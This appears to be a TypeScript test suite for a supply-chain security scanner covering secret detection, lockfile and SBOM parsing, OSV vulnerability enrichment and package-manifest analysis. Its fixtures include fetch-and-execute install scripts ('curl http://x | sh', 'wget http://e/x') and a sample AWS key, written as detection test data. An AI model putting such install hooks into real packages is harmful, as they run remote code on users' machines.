import { strict as assert } from "node:assert";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { SecretScanner, parseGitLog, redact, shannonEntropy, loadIgnoreFile, runSecretsScan } from "../secrets/index.js";
import { dedupeGeneric } from "../secrets/engine.js";
import { parseGoSum, parsePackageLock, parseRequirements } from "../sca/lockfiles.js";
import { cvss3Score, scanPackages, scoreToSeverity } from "../sca/osvClient.js";
import type { FetchFn } from "../sca/osvClient.js";
import { analyzeManifest, executableKind, levenshtein, riskScore, runPkgIntel, typosquatOf, POPULAR_NPM } from "../pkgintel/index.js";
import { runScanners } from "../../audit/scanners.js";

const tmp = (): string => fs.mkdtempSync(path.join(os.tmpdir(), "loam-native-"));
const AWS = "AKIA" + "IOSFODNN7EXAMPLQ";

test("entropy and redaction", () => {
  assert.equal(shannonEntropy(""), 0);
  assert.ok(shannonEntropy("aB3$xZ9!qW") > shannonEntropy("aaaaaaaaaa"));
  assert.equal(redact("abcdefgh", 100), "REDACTED");
  assert.equal(redact("abcdefgh", 50), "abcd...");
  assert.equal(redact("abcdefgh", 0), "abcdefgh");
});

test("secret scanner finds an AWS key, redacts it and honours inline allow", () => {
  const s = new SecretScanner();
  const hit = s.scan(`const k = "${AWS}";\n`, "a.ts");
  assert.equal(hit.length, 1);
  assert.equal(hit[0]!.ruleId, "aws-access-key-id");
  assert.equal(hit[0]!.line, 1);
  assert.ok(!JSON.stringify(hit).includes(AWS));
  assert.deepEqual(s.scan(`const k = "${AWS}"; // loam:allow\n`, "a.ts"), []);
});

test("fingerprint ignore list drops a finding", () => {
  const first = new SecretScanner().scan(`${AWS}\n`, "x.env")[0]!;
  assert.deepEqual(new SecretScanner({ ignore: new Set([first.fingerprint]) }).scan(`${AWS}\n`, "x.env"), []);
});

test("dedupeGeneric drops a generic hit on a line a specific rule already hit", () => {
  const mk = (ruleId: string, line: number) => ({ ruleId, description: "", severity: "high" as const, file: "f", line, secret: "", entropy: 0, fingerprint: ruleId + line });
  const out = dedupeGeneric([mk("aws", 1), mk("generic", 1), mk("generic", 2)], new Set(["generic"]));
  assert.deepEqual(out.map((x) => x.fingerprint), ["aws1", "generic2"]);
});

test("parseGitLog attributes added lines to commit, file and line", () => {
  const log = [
    "commit abcdef1234567", "Author: a", "", "diff --git a/x b/x", "--- a/x", "+++ b/x", "@@ -0,0 +5,2 @@", "+one", "+two", "",
  ].join("\n");
  assert.deepEqual(parseGitLog(log), [{ commit: "abcdef1234567", file: "x", text: "one\ntwo", firstLine: 5 }]);
});

test("runSecretsScan walks a directory and reads .loamignore", () => {
  const d = tmp();
  try {
    fs.writeFileSync(path.join(d, "a.env"), `KEY=${AWS}\n`);
    const r = runSecretsScan(d);
    assert.equal(r.hits.length, 1);
    assert.equal(r.hits[0]!.tool, "loam-secrets");
    assert.ok(r.sarif);
    fs.writeFileSync(path.join(d, ".loamignore"), `# baseline\n${new SecretScanner().scan(`KEY=${AWS}\n`, "a.env")[0]!.fingerprint}\n`);
    assert.ok(loadIgnoreFile(d).size === 1);
    assert.equal(runSecretsScan(d).hits.length, 0);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test("lockfile parsers", () => {
  const lock = JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/left-pad": { version: "1.3.0" } } });
  assert.deepEqual(parsePackageLock(lock, "package-lock.json").map((p) => `${p.name}@${p.version}`), ["left-pad@1.3.0"]);
  assert.deepEqual(parseRequirements("requests==2.19.0\n# c\nflask>=1\n", "r.txt").map((p) => `${p.name}@${p.version}`), ["requests@2.19.0"]);
  assert.equal(parseGoSum("github.com/a/b v1.0.0 h1:x=\ngithub.com/a/b v1.0.0/go.mod h1:y=\n", "go.sum")[0]!.name, "github.com/a/b");
});

test("cvss3Score matches the published base scores", () => {
  assert.equal(cvss3Score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"), 9.8);
  assert.equal(cvss3Score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"), 10);
  assert.equal(cvss3Score("CVSS:2.0/AV:N"), null);
  assert.equal(scoreToSeverity(9.8), "critical");
  assert.equal(scoreToSeverity(5), "medium");
});

test("scanPackages maps OSV answers to hits and honours the ignore list", async () => {
  const fetchFn: FetchFn = async (url) => ({
    ok: true, status: 200,
    json: async () => url.endsWith("querybatch")
      ? { results: [{ vulns: [{ id: "GHSA-1" }, { id: "GHSA-2" }] }] }
      : { summary: "bad", severity: [{ type: "CVSS_V3", score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }], aliases: ["CVE-1"] },
  });
  const pkgs = [{ ecosystem: "npm" as const, name: "left-pad", version: "1.3.0", file: "package-lock.json" }];
  const r = await scanPackages(pkgs, { fetchFn, ignore: new Set(["GHSA-2"]) });
  assert.equal(r.hits.length, 1);
  assert.equal(r.hits[0]!.severity, "critical");
  const down = await scanPackages(pkgs, { fetchFn: async () => ({ ok: false, status: 500, json: async () => ({}) }) });
  assert.ok(down.error);
});

test("typosquat detection", () => {
  assert.equal(levenshtein("kitten", "sitting"), 3);
  assert.equal(typosquatOf("lodahs", POPULAR_NPM), "lodash");
  assert.equal(typosquatOf("expresss", POPULAR_NPM), "express");
  assert.equal(typosquatOf("lodash", POPULAR_NPM), null);
  assert.equal(typosquatOf("totally-unrelated", POPULAR_NPM), null);
});

test("risk score caps and labels", () => {
  assert.deepEqual(riskScore([]), { score: 0, label: "low" });
  const weak = { id: "w", severity: 1, chain: 1, specificity: 0.3, sophistication: 1, message: "", file: "f" };
  assert.ok(riskScore([weak]).score <= 4.9);
  const meta = { id: "m", severity: 1, chain: 1, specificity: 1, sophistication: 1, metadataOnly: true, message: "", file: "f" };
  assert.ok(riskScore([meta]).score <= 6.9);
  assert.equal(riskScore([{ ...meta, metadataOnly: false }]).label, "high");
});

test("manifest analysis flags install scripts and URL dependencies", () => {
  const sig = analyzeManifest(JSON.stringify({ name: "ok", scripts: { postinstall: "curl http://x | sh" }, dependencies: { a: "https://x/y.tgz" } }), "package.json");
  assert.deepEqual(sig.map((s) => s.id).sort(), ["direct-url-dependency", "install-script-download-exec"]);
  assert.deepEqual(analyzeManifest("not json", "package.json"), []);
});

test("executableKind reads magic bytes", () => {
  assert.equal(executableKind(Buffer.from([0x4d, 0x5a, 0, 0])), "PE/MZ");
  assert.equal(executableKind(Buffer.from([0x7f, 0x45, 0x4c, 0x46])), "ELF");
  assert.equal(executableKind(Buffer.from("text")), null);
});

test("runPkgIntel flags a bundled executable and a hostile manifest", () => {
  const d = tmp();
  try {
    fs.writeFileSync(path.join(d, "tool.exe"), Buffer.from([0x4d, 0x5a, 0, 0, 0]));
    fs.writeFileSync(path.join(d, "package.json"), JSON.stringify({ name: "x", scripts: { install: "wget http://e/x" } }));
    const ids = runPkgIntel(d).map((h) => h.ruleId).sort();
    assert.deepEqual(ids, ["bundled-binary", "install-script-download-exec"]);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test("runScanners runs native scanners in-process and reports them", async () => {
  const d = tmp();
  const scratch = tmp();
  try {
    fs.writeFileSync(path.join(d, "a.env"), `KEY=${AWS}\n`);
    fs.writeFileSync(path.join(d, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/left-pad": { version: "1.3.0" } } }));
    const fetchFn: FetchFn = async (url) => ({
      ok: true, status: 200,
      json: async () => (url.endsWith("querybatch") ? { results: [{ vulns: [{ id: "GHSA-9" }] }] } : { summary: "s" }),
    });
    const out = await runScanners({ target: d, scratch, tools: ["loam-secrets", "loam-sca", "loam-pkg", "nope"], fetchFn });
    const status = Object.fromEntries(out.reports.map((r) => [r.tool, r.status]));
    assert.deepEqual(status, { "loam-secrets": "ok", "loam-sca": "ok", "loam-pkg": "ok", nope: "skipped" });
    assert.ok(out.hits.some((h) => h.tool === "loam-secrets"));
    assert.ok(out.hits.some((h) => h.tool === "loam-sca" && h.ruleId === "GHSA-9"));
    assert.ok(out.sarif.some((s) => s.tool === "loam-secrets"));
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
    fs.rmSync(scratch, { recursive: true, force: true });
  }
});

import { IntelCache } from "../intel/cache.js";
import { resetKevMemo, KEV_URL } from "../intel/kev.js";
import { toSarif } from "../sca/osvClient.js";
import { compare, maxOf, smallestFixAbove } from "../sca/versions.js";

const VULN_DETAIL = {
  summary: "RCE in left-pad",
  severity: [{ type: "CVSS_V3", score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }],
  aliases: ["CVE-2024-1111"],
  published: "2024-06-01T00:00:00Z",
  affected: [{ package: { name: "left-pad", ecosystem: "npm" }, ranges: [{ type: "ECOSYSTEM", events: [{ introduced: "0" }, { fixed: "1.3.1" }, { fixed: "1.4.0" }] }] }],
};

test("scanPackages enriches hits with KEV/EPSS/risk, escalates severity and computes fixedIn", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "loam-sca-"));
  try {
    const cache = new IntelCache(path.join(dir, "c.db"));
    resetKevMemo();
    const fetchFn: FetchFn = async (url) => ({
      ok: true, status: 200,
      json: async () => url.endsWith("querybatch")
        ? { results: [{ vulns: [{ id: "GHSA-1" }] }] }
        : url.includes("/vulns/")
        ? VULN_DETAIL
        : url === KEV_URL
        ? { vulnerabilities: [{ cveID: "CVE-2024-1111", dateAdded: "2024-06-02", dueDate: "2024-06-16", knownRansomwareCampaignUse: "Known" }] }
        : { data: [{ cve: "CVE-2024-1111", epss: "0.82", percentile: "0.98" }] },
    });
    const r = await scanPackages([{ ecosystem: "npm", name: "left-pad", version: "1.3.0", file: "package-lock.json" }], { fetchFn, cache });
    assert.equal(r.hits.length, 1);
    const raw = r.hits[0]!.raw as { cves: string[]; fixedIn?: string; upgradeTo?: string; baseSeverity: string; risk?: { risk_score: number; risk_label: string }; kev?: { ransomware: boolean }; epss?: { epss: number } };
    assert.deepEqual(raw.cves, ["CVE-2024-1111"]);
    assert.equal(raw.fixedIn, "1.3.1", "smallest fix above the installed 1.3.0");
    assert.equal(raw.upgradeTo, "1.3.1");
    assert.equal(raw.baseSeverity, "critical");
    assert.equal(raw.kev?.ransomware, true);
    assert.equal(raw.epss?.epss, 0.82);
    assert.ok(raw.risk && raw.risk.risk_score >= 76 && raw.risk.risk_label === "CRITICAL", "KEV hard override");
    assert.equal(r.hits[0]!.severity, "critical");
    assert.ok(!r.notes?.length, "all sources up: no notes");
    const sarif = toSarif(r.hits) as { runs: { tool: { driver: { rules: { id: string; properties: Record<string, unknown> }[] } }; results: { ruleId: string; level: string; partialFingerprints: Record<string, string> }[] }[] };
    const res = sarif.runs[0]!.results[0]!;
    assert.equal(res.level, "error");
    assert.equal(res.partialFingerprints.dependency, "npm/left-pad@1.3.0/GHSA-1");
    cache.close();
  } finally { fs.rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); }
});

test("scanPackages records kev_unavailable instead of swallowing it, hits keep scanner severity", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "loam-sca-"));
  try {
    const cache = new IntelCache(path.join(dir, "c.db"));
    resetKevMemo();
    cache.clear();
    const fetchFn: FetchFn = async (url) => ({
      ok: url.endsWith("querybatch") || url.includes("/vulns/"),
      status: url.endsWith("querybatch") || url.includes("/vulns/") ? 200 : 503,
      json: async () => (url.endsWith("querybatch") ? { results: [{ vulns: [{ id: "GHSA-1" }] }] } : VULN_DETAIL),
    });
    const r = await scanPackages([{ ecosystem: "npm", name: "left-pad", version: "1.3.0", file: "package-lock.json" }], { fetchFn, cache });
    assert.ok(r.notes?.some((n) => n.startsWith("kev_unavailable")), JSON.stringify(r.notes));
    assert.ok(r.notes?.some((n) => n.startsWith("epss_unreachable")));
    assert.equal(r.hits[0]!.severity, "critical", "scanner CVSS severity untouched");
    assert.equal((r.hits[0]!.raw as { risk?: unknown }).risk, undefined, "no risk object without KEV/EPSS grounding");
    cache.close();
  } finally { fs.rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); }
});

test("version comparator picks upgrade targets across ecosystems", () => {
  assert.equal(compare("4.17.20", "4.17.21"), -1);
  assert.equal(compare("1.10.0", "1.9.9"), 1);
  assert.equal(compare("v1.2.3", "1.2.3"), 0);
  assert.equal(compare("1.0", "1.0.0"), 0);
  assert.equal(compare("1.0.0-rc.1", "1.0.0"), -1);
  assert.equal(compare("1.0.post1", "1.0"), 1);
  assert.equal(compare("1:1.0", "2.0"), 1);
  assert.equal(compare("1.0~rc1", "1.0"), -1);
  assert.equal(maxOf(["1.2.0", "1.10.0", "1.9.0"]), "1.10.0");
  assert.equal(smallestFixAbove(["1.3.1", "1.4.0"], "1.3.0"), "1.3.1");
  assert.equal(smallestFixAbove(["1.2.9"], "1.3.0"), null, "no fix above the installed version");
});

import { parseCycloneDx, parseGoMod, parseLines, parsePomXml, parsePurl, parseSpdxJson, parseSpdxTagValue, parseYarnBerry, discover } from "../sca/lockfiles.js";

test("purl parsing maps types to ecosystems and rejects unsupported ones", () => {
  const p = parsePurl("pkg:npm/%40babel/core@7.23.0", "bom.json");
  assert.deepEqual(p && [p.ecosystem, p.name, p.version], ["npm", "@babel/core", "7.23.0"]);
  const g = parsePurl("pkg:golang/github.com/a/b@v1.2.3", "bom.json");
  assert.deepEqual(g && [g.ecosystem, g.name], ["Go", "github.com/a/b"]);
  const py = parsePurl("pkg:pypi/Django@4.2", "bom.json");
  assert.deepEqual(py && [py.ecosystem, py.name], ["PyPI", "django"]);
  assert.equal(parsePurl("pkg:deb/debian/openssl@3.0", "bom.json"), null);
  assert.equal(parsePurl("pkg:github/octocat/hello@1.0", "bom.json"), null);
  assert.equal(parsePurl("not-a-purl", "bom.json"), null);
});

test("CycloneDX JSON parses nested components and counts unsupported purls", () => {
  const doc = JSON.stringify({
    bomFormat: "CycloneDX",
    components: [
      { name: "a", purl: "pkg:npm/express@4.18.0" },
      { name: "b", purl: "pkg:deb/debian/curl@8.0", components: [{ name: "c", purl: "pkg:cargo/serde@1.0.190" }] },
    ],
  });
  const acc = { unsupported: 0 };
  const pkgs = parseCycloneDx(doc, "bom.json", acc);
  assert.deepEqual(pkgs.map((p) => `${p.ecosystem}/${p.name}@${p.version}`), ["npm/express@4.18.0", "crates.io/serde@1.0.190"]);
  assert.equal(acc.unsupported, 1);
  assert.deepEqual(parseCycloneDx('{"bomFormat":"nope"}', "bom.json"), []);
});

test("SPDX JSON and tag-value parsers extract purl references", () => {
  const json = JSON.stringify({ spdxVersion: "SPDX-2.3", packages: [{ name: "a", externalRefs: [{ referenceType: "purl", referenceLocator: "pkg:npm/left-pad@1.3.0" }] }] });
  assert.deepEqual(parseSpdxJson(json, "s.spdx.json").map((p) => p.name), ["left-pad"]);
  const tv = "SPDXVersion: SPDX-2.3\nPackageName: left-pad\nExternalRef: PACKAGE-MANAGER purl pkg:npm/left-pad@1.3.0\n";
  assert.deepEqual(parseSpdxTagValue(tv, "x.spdx").map((p) => p.name), ["left-pad"]);
});

test("yarn berry, go.mod, pom.xml and free-form line parsers", () => {
  const berry = '__metadata:\n  version: 8\n\n"@babel/core@npm:7.23.0":\n  version: 7.23.0\n  resolution: "@babel/core@npm:7.23.0"\n\n"local@workspace:.":\n  resolution: "local@workspace:."\n';
  assert.deepEqual(parseYarnBerry(berry, "yarn.lock").map((p) => `${p.name}@${p.version}`), ["@babel/core@7.23.0"]);
  const gomod = "module x\n\ngo 1.22\n\nrequire (\n\tgithub.com/a/b v1.2.3 // indirect\n\tgithub.com/c/d v2.0.0+incompatible\n)\n";
  assert.deepEqual(parseGoMod(gomod, "go.mod").map((p) => `${p.name}@${p.version}`), ["github.com/a/b@v1.2.3", "github.com/c/d@v2.0.0+incompatible"]);
  const pom = '<project><properties><spring.version>5.3.18</spring.version></properties><dependencies><dependency><groupId>org.springframework</groupId><artifactId>spring-core</artifactId><version>${spring.version}</version></dependency><dependency><groupId>x</groupId><artifactId>y</artifactId><version>${missing}</version></dependency></dependencies></project>';
  assert.deepEqual(parsePomXml(pom, "pom.xml").map((p) => `${p.name}@${p.version}`), ["org.springframework:spring-core@5.3.18"], "unresolved ${} entries are dropped");
  const lines = "# comment\npkg:npm/express@4.18.0\nleft-pad:npm:1.3.0\ndjango:PyPI:4.2\nnonsense line\n";
  assert.deepEqual(parseLines(lines, "deps.txt").map((p) => `${p.ecosystem}/${p.name}`), ["npm/express", "npm/left-pad", "PyPI/django"]);
});

test("discover walks SBOMs and UTF-16 files, and go.sum pins go.mod", () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "loam-disc-"));
  try {
    fs.writeFileSync(path.join(d, "bom.json"), JSON.stringify({ bomFormat: "CycloneDX", components: [{ purl: "pkg:npm/express@4.18.0" }, { purl: "pkg:github/a/b@1.0" }] }));
    fs.writeFileSync(path.join(d, "my.cdx.json"), JSON.stringify({ bomFormat: "CycloneDX", components: [{ purl: "pkg:cargo/serde@1.0.190" }] }));
    fs.writeFileSync(path.join(d, "requirements.txt"), Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("requests==2.19.0\n", "utf16le")]));
    fs.writeFileSync(path.join(d, "go.sum"), "github.com/a/b v1.2.3 h1:x=\n");
    fs.writeFileSync(path.join(d, "go.mod"), "module x\n\nrequire github.com/a/b v1.2.3\n");
    fs.mkdirSync(path.join(d, "sub"));
    fs.writeFileSync(path.join(d, "sub", "go.mod"), "module x\n\nrequire github.com/z/z v9.9.9\n");
    const r = discover(d);
    // parseGoSum strips the leading `v`; the pinned go.sum shadows root go.mod; sub/go.mod has no sibling go.sum.
    const keys = r.pkgs.map((p) => `${p.ecosystem}:${p.name}@${p.version}`).sort();
    assert.deepEqual(keys, ["Go:github.com/a/b@1.2.3", "Go:github.com/z/z@v9.9.9", "PyPI:requests@2.19.0", "crates.io:serde@1.0.190", "npm:express@4.18.0"]);
    assert.equal(r.unsupported, 1);
    assert.ok(r.pkgs.some((p) => p.name === "requests" && p.file === "requirements.txt"), "UTF-16 requirements decoded");
    assert.ok(r.pkgs.some((p) => p.name === "github.com/z/z" && p.file === "sub/go.mod"), "go.mod without sibling go.sum is parsed");
    assert.ok(!r.pkgs.some((p) => p.file === "go.mod"), "root go.mod shadowed by sibling go.sum");
  } finally { fs.rmSync(d, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); }
});
